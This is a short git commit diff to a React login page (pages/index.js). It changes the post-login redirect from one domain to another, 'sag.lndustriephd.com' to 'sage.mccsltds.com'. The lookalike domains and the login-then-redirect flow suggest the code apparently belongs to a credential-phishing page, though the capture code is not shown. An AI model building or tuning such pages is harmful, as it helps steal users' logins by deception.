6d1ace8aa8267b3e84b43339bda703d194f2249b
husknet <127146284+husknet@users.noreply.github.com>
2025-01-28 10:24:47 -0400

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://sag.lndustriephd.com/';
+      window.location.href = 'https://sage.mccsltds.com/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
